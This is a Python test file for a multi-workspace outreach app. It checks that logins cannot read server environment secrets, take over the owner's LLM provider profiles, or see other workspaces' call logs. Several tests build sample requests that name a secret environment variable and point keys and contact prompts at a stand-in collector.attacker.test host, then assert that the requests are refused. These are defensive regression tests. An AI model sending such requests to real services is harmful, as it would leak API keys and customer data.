"""No login can reach a key it was not given (D-154, D-155).

Keys are typed in the app (DD-64). Two older paths broke that: a draft request
could name any server environment variable and a URL to send it to, and the
install-wide provider profiles let any login re-point the owner's profile at
its own server. Each test acts as a real workspace login through the API.
"""
from __future__ import annotations

import json

import pytest
from fastapi.testclient import TestClient

from offsetx_apollo_builder.api.app import create_app
from offsetx_apollo_builder.outreach import provider_profiles as profiles_module
from test_workspace_isolation import ADMIN_TOKEN, _login, _settings

ADMIN = {"X-Offsetx-Token": ADMIN_TOKEN}
OWNER_KEY = "sk-owner-typed-in-the-app-" + "k" * 20


@pytest.fixture()
def client(tmp_path, monkeypatch):
    monkeypatch.setenv("OFFSETX_PROBE_SECRET", "server-secret-that-must-not-leave")
    with TestClient(create_app(_settings(tmp_path))) as test_client:
        assert test_client.post(
            "/api/v1/workspaces",
            headers=ADMIN,
            json={"username": "beta-user", "workspace_id": "beta", "password": "beta-password-1"},
        ).status_code == 201
        yield test_client


@pytest.fixture()
def built(monkeypatch):
    """Every provider a profile builds, with the environment it was handed."""
    calls: list[tuple[dict, object]] = []

    class Stub:
        def generate(self, **_):
            raise AssertionError("no draft should reach a provider in these tests")

    def fake(config, environ=None):
        calls.append(({"base_url": config.base_url, "api_key_env": config.api_key_env}, environ))
        return Stub()

    monkeypatch.setattr(profiles_module, "create_provider", fake)
    return calls


def _owner_profile(client) -> str:
    saved = client.post(
        "/api/v1/provider-profiles",
        headers=ADMIN,
        json={
            "name": "Owner's OpenAI",
            "provider_type": "openai_compatible",
            "model": "gpt-4o-mini",
            "api_key": OWNER_KEY,
            "base_url": "https://api.openai.com/v1",
        },
    )
    assert saved.status_code == 201, saved.text
    return saved.json()["id"]


def test_a_draft_request_cannot_name_an_environment_variable_or_a_url(client):
    _login(client, "beta")
    campaign = client.post("/api/v1/campaigns", json={"name": "Beta"}).json()["id"]
    answer = client.post(
        f"/api/v1/campaigns/{campaign}/drafts/generate",
        json={
            "campaign_contact_ids": [],
            "stages": ["initial"],
            "provider": {
                "provider_type": "openai_compatible",
                "model": "x",
                "api_key_env": "OFFSETX_PROBE_SECRET",
                "base_url": "https://collector.attacker.test/v1",
            },
        },
    )
    assert answer.status_code == 422


def test_a_profile_cannot_name_an_environment_variable(client):
    answer = client.post(
        "/api/v1/provider-profiles",
        headers=ADMIN,
        json={
            "name": "From the environment",
            "provider_type": "openai_compatible",
            "api_key_env": "OFFSETX_PROBE_SECRET",
            "base_url": "https://collector.attacker.test/v1",
        },
    )
    assert answer.status_code == 422


def test_a_stored_profile_naming_a_variable_never_reads_the_environment(client, built):
    """Profiles saved before this change may still name one."""
    store = client.app.state.provider_profiles
    store.upsert(
        {"name": "Legacy", "provider_type": "openai_compatible",
         "api_key_env": "OFFSETX_PROBE_SECRET", "base_url": "https://collector.attacker.test/v1"},
        owner="local",
    )
    store.router(owner="local")
    assert built, "the router built no provider"
    for _, environ in built:
        assert environ is not None, "handed the server's real environment"
        assert "server-secret-that-must-not-leave" not in dict(environ).values()


def test_a_client_login_sees_none_of_the_owners_profiles(client):
    _owner_profile(client)
    _login(client, "beta")
    assert client.get("/api/v1/provider-profiles").json()["items"] == []


def test_a_client_login_cannot_repoint_test_or_delete_the_owners_profile(client, built):
    profile = _owner_profile(client)
    _login(client, "beta")
    repointed = client.post(
        "/api/v1/provider-profiles",
        json={"id": profile, "name": "Mine now", "provider_type": "openai_compatible",
              "base_url": "https://collector.attacker.test/v1"},
    )
    assert repointed.status_code == 404
    assert client.post(f"/api/v1/provider-profiles/{profile}/test", json={"live_probe": True}).status_code == 404
    assert client.post(f"/api/v1/provider-profiles/{profile}/delete").status_code == 404
    kept = client.app.state.provider_profiles.list()
    assert [item["base_url"] for item in kept] == ["https://api.openai.com/v1"]
    assert not built  # nothing was built, so nothing could be sent


def test_a_client_login_drafts_with_its_own_profiles_only(client, built):
    _owner_profile(client)
    _login(client, "beta")
    campaign = client.post("/api/v1/campaigns", json={"name": "Beta"}).json()["id"]
    client.post(
        f"/api/v1/campaigns/{campaign}/drafts/generate",
        json={"campaign_contact_ids": [], "stages": ["initial"], "use_provider_fallback": True},
    )
    assert not built  # the owner's profile was never assembled for beta


def test_a_client_logins_new_profile_is_its_own(client):
    _login(client, "beta")
    saved = client.post(
        "/api/v1/provider-profiles",
        json={"name": "Beta's", "provider_type": "openai_compatible",
              "api_key": "sk-beta-" + "b" * 20, "base_url": "https://api.openai.com/v1"},
    )
    assert saved.status_code == 201, saved.text
    assert saved.json()["owner"] == "beta"


# ── Second review of 2026-09-25: whose profiles a draft may use ────────────

ATTACKER = "https://collector.attacker.test/v1"
OWNER_URL = "https://api.openai.com/v1"
CSV = b"""Full Name,Email,Company,Title,Category,Public Hook,Hook Source,Tension
Anita Rao,anita@example.com,Example Exports,Climate Lead,CBAM,Published a supplier emissions brief,https://example.com/anita,Supplier evidence handoff
"""


@pytest.fixture()
def seen(monkeypatch):
    """Every provider a profile builds: its URL, the key it got, the prompts sent."""
    log: list[dict] = []

    class Stub:
        def __init__(self, config, environ):
            self.entry = {"base_url": config.base_url, "environ": dict(environ or {}), "prompts": []}
            log.append(self.entry)

        def generate(self, *, system_prompt, user_prompt):
            self.entry["prompts"].append(user_prompt)
            return '{"subject": "Hello", "body": "Written for the test"}'

    monkeypatch.setattr(profiles_module, "create_provider", lambda config, environ=None: Stub(config, environ))
    return log


def _campaign_with_contact(client, headers=None) -> str:
    campaign = client.post("/api/v1/campaigns", headers=headers, json={"name": "Owner"}).json()["id"]
    imported = client.post(
        f"/api/v1/campaigns/{campaign}/contacts/import", headers=headers,
        files={"file": ("c.csv", CSV, "text/csv")},
        data={"default_category": "Sustainability / ESG / Climate"},
    )
    assert imported.status_code == 200, imported.text
    return campaign


def _generate(client, campaign, headers=None, **extra):
    # Exactly what Drafts.tsx posts in fallback mode.
    return client.post(
        f"/api/v1/campaigns/{campaign}/drafts/generate", headers=headers,
        json={"campaign_contact_ids": [], "stages": ["initial"], "use_provider_fallback": True,
              "provider_profile_ids": [], "fallback_strategy": "priority", **extra},
    )


def _beta_plants_a_profile(client) -> str:
    _login(client, "beta")
    planted = client.post("/api/v1/provider-profiles", json={
        "name": "Fast", "provider_type": "openai_compatible", "model": "x", "priority": 1,
        "api_key": "sk-beta-" + "b" * 20, "base_url": ATTACKER, "data_policy": "full"})
    assert planted.status_code == 201, planted.text
    client.cookies.clear()
    return planted.json()["id"]


def _sent_to(seen, url) -> list[str]:
    return [prompt for entry in seen if entry["base_url"] == url for prompt in entry["prompts"]]


def test_the_owners_drafts_never_run_through_another_workspaces_profile(client, seen):
    """D-165: the owner's chain was every workspace's profiles, so a client's
    priority-1 profile received the owner's contacts and wrote the owner's drafts."""
    _beta_plants_a_profile(client)
    _owner_profile(client)
    campaign = _campaign_with_contact(client, ADMIN)
    answer = _generate(client, campaign, ADMIN)
    assert answer.status_code == 200, answer.text
    assert _sent_to(seen, ATTACKER) == []
    # The owner's own profile wrote it (at "minimal", so the name is redacted).
    assert _sent_to(seen, OWNER_URL)


def test_with_no_profile_of_its_own_the_owner_is_told_so(client, seen):
    _beta_plants_a_profile(client)
    campaign = _campaign_with_contact(client, ADMIN)
    answer = _generate(client, campaign, ADMIN)
    assert answer.status_code == 503
    assert "your workspace" in answer.json()["detail"]
    assert _sent_to(seen, ATTACKER) == []


def test_a_workspace_named_default_gets_none_of_the_owners_profiles(client, seen):
    """D-166: the owner's profiles were saved with owner "default", a name any
    workspace could be given — and then owned them, key included."""
    saved = client.post("/api/v1/provider-profiles", headers=ADMIN, json={
        "owner": "default",  # what the old Settings form always sent
        "name": "Owner's", "provider_type": "openai_compatible", "model": "gpt-4o-mini",
        "api_key": OWNER_KEY, "base_url": OWNER_URL})
    assert saved.status_code == 201, saved.text
    assert saved.json()["owner"] == "local"
    pid = saved.json()["id"]
    assert client.post("/api/v1/workspaces", headers=ADMIN, json={
        "username": "default-user", "workspace_id": "default",
        "password": "default-password-1"}).status_code == 201
    _login(client, "default")
    assert client.get("/api/v1/provider-profiles").json()["items"] == []
    moved = client.post("/api/v1/provider-profiles", json={
        "id": pid, "name": "Mine", "provider_type": "openai_compatible", "model": "x", "base_url": ATTACKER})
    assert moved.status_code == 404
    assert client.post(f"/api/v1/provider-profiles/{pid}/test", json={"live_probe": True}).status_code == 404
    assert _sent_to(seen, ATTACKER) == [] and not [e for e in seen if OWNER_KEY in e["environ"].values()]


def _legacy_profile(client, *, owner="default", url=ATTACKER) -> str:
    """A profile as saved before ownership was recorded: whoever saved it is unknown."""
    store = client.app.state.provider_profiles
    store.profile_path.parent.mkdir(parents=True, exist_ok=True)
    store.profile_path.write_text(json.dumps([{
        "id": "legacy-1", "owner": owner, "name": "Old", "provider_type": "openai_compatible",
        "model": "x", "base_url": url, "priority": 1, "enabled": True, "data_policy": "full"}]))
    store._write_secrets({"legacy-1": "sk-legacy-" + "l" * 20})
    return "legacy-1"


def test_a_profile_saved_before_ownership_is_in_no_chain_until_the_owner_confirms_it(client, seen):
    """D-166: every old profile carries a label anyone could have typed, so
    none is trusted until the owner says it is theirs."""
    pid = _legacy_profile(client)
    _login(client, "beta")
    assert client.get("/api/v1/provider-profiles").json()["items"] == []
    beta_campaign = _campaign_with_contact(client)
    _generate(client, beta_campaign)
    assert client.post(f"/api/v1/provider-profiles/{pid}/confirm").status_code == 403
    client.cookies.clear()

    listed = client.get("/api/v1/provider-profiles", headers=ADMIN).json()["items"]
    assert [(item["id"], item["owner_confirmed"]) for item in listed] == [(pid, False)]
    assert client.get("/api/v1/provider-profiles?mine=true", headers=ADMIN).json()["items"] == []
    campaign = _campaign_with_contact(client, ADMIN)
    refused = _generate(client, campaign, ADMIN)
    assert refused.status_code == 503
    assert "confirm" in refused.json()["detail"].lower()
    assert _sent_to(seen, ATTACKER) == []

    confirmed = client.post(f"/api/v1/provider-profiles/{pid}/confirm", headers=ADMIN)
    assert confirmed.status_code == 200, confirmed.text
    assert confirmed.json()["owner"] == "local" and confirmed.json()["owner_confirmed"] is True
    assert [item["id"] for item in client.get(
        "/api/v1/provider-profiles?mine=true", headers=ADMIN).json()["items"]] == [pid]
    assert _generate(client, campaign, ADMIN).status_code == 200
    assert any("Anita Rao" in prompt for prompt in _sent_to(seen, ATTACKER))


def test_confirming_never_takes_another_workspaces_profile(client):
    planted = _beta_plants_a_profile(client)
    taken = client.post(f"/api/v1/provider-profiles/{planted}/confirm", headers=ADMIN)
    assert taken.status_code == 409
    assert "beta" in taken.json()["detail"]
    assert client.app.state.provider_profiles.list(owner="beta")[0]["id"] == planted
    assert client.post("/api/v1/provider-profiles/nope/confirm", headers=ADMIN).status_code == 404


def test_a_request_cannot_choose_whose_profiles_it_saves_or_drafts_with(client, seen):
    _login(client, "beta")
    as_owner = client.post("/api/v1/provider-profiles", json={
        "owner": "local", "name": "B", "provider_type": "openai_compatible", "base_url": OWNER_URL})
    assert as_owner.status_code == 422
    assert "owner" in as_owner.json()["detail"]
    client.cookies.clear()
    for_beta = client.post("/api/v1/provider-profiles", headers=ADMIN, json={
        "owner": "beta", "name": "O", "provider_type": "openai_compatible", "base_url": OWNER_URL})
    assert for_beta.status_code == 422
    campaign = _campaign_with_contact(client, ADMIN)
    chosen = _generate(client, campaign, ADMIN, provider_owner="beta")
    assert chosen.status_code == 422
    assert "provider owner" in chosen.json()["detail"]
    assert seen == []


def test_the_provider_call_log_shows_a_client_only_its_own_calls(client, seen):
    """D-168: any login read every workspace's calls, prompts included."""
    owner_pid = client.post("/api/v1/provider-profiles", headers=ADMIN, json={
        "name": "Owner's", "provider_type": "openai_compatible", "model": "gpt-4o-mini",
        "api_key": OWNER_KEY, "base_url": OWNER_URL, "audit_payloads": True}).json()["id"]
    assert _generate(client, _campaign_with_contact(client, ADMIN), ADMIN).status_code == 200
    beta_pid = _beta_plants_a_profile(client)
    _login(client, "beta")
    assert _generate(client, _campaign_with_contact(client)).status_code == 200
    beta_rows = client.get("/api/v1/provider-calls").json()["items"]
    assert beta_rows and {row["profile_id"] for row in beta_rows} == {beta_pid}
    assert {row["workspace_id"] for row in beta_rows} == {"beta"}
    assert client.get(f"/api/v1/provider-calls?profile_id={owner_pid}").json()["items"] == []
    client.cookies.clear()
    owner_rows = client.get("/api/v1/provider-calls", headers=ADMIN).json()["items"]
    assert {(row["profile_id"], row["workspace_id"]) for row in owner_rows} == {
        (owner_pid, "local"), (beta_pid, "beta")}
